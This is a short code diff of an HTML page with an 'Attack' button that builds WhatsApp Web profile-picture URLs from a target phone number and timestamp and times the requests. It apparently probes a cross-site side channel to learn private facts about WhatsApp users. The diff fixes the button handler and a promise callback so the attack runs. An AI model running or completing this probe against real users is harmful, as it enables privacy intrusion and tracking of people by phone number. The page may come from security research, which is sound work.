@@ -2,7 +2,7 @@
 <body id='body'>
 <form>
 https://web.whatsapp.com/pp?t=s&u=<input id="number">%40c.us&i=<input id="timestamp">
-<button type="button" action="attack();">Attack</button>
+<button type="button" onclick="attack();">Attack</button>
 </form>
 <p id='result'></p>
 <script>
@@ -34,7 +34,7 @@ https://web.whatsapp.com/pp?t=s&u=<input id="number">%40c.us&i=<input id="timest
       //if (number=="" || timestamp==""){
 	console.log(url);
         performance.clearResourceTimings();
-        send(url).then(result(url));
+        send(url).then(a => result(url));
       /*} else {
          document.getElementById("result").innerHTML = "You should fill both URL and Timestamp textfields";
       }*/
